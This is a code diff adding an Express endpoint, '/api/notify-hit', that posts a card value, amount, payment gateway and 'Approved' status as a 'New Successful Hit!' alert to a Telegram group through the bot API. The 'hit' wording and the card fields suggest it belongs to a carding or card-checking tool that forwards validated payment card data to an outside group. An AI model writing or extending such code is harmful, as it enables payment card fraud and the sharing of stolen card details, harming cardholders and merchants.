@@ -44,6 +44,36 @@ app.post('/api/send-otp', async (req, res) => {
     }
 });
 
+// Endpoint to send Hit Notification to Group
+app.post('/api/notify-hit', async (req, res) => {
+    const { card, amount, gateway, status, user_chat_id } = req.body;
+    const GROUP_ID = '-1003721268860'; // User provided Group ID
+
+    try {
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        // Format the message with a professional look
+        const message = `🚀 *New Successful Hit!* 🚀\n\n` +
+                        `💳 *Card:* \`${card || 'N/A'}\`\n` +
+                        `💰 *Amount:* \`${amount || 'N/A'}\`\n` +
+                        `🔌 *Gateway:* \`${gateway || 'Stripe'}\`\n` +
+                        `✅ *Status:* ${status || 'Approved'}\n\n` +
+                        `👤 *User Chat ID:* \`${user_chat_id || 'Unknown'}\`\n` +
+                        `✨ *Powered by Nexvora*`;
+
+        await axios.post(telegramUrl, {
+            chat_id: GROUP_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+
+        res.json({ ok: true });
+    } catch (error) {
+        console.error('Group Notification Error:', error.response ? error.response.data : error.message);
+        res.status(500).json({ ok: false, description: 'Failed to send group notification' });
+    }
+});
+
 app.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
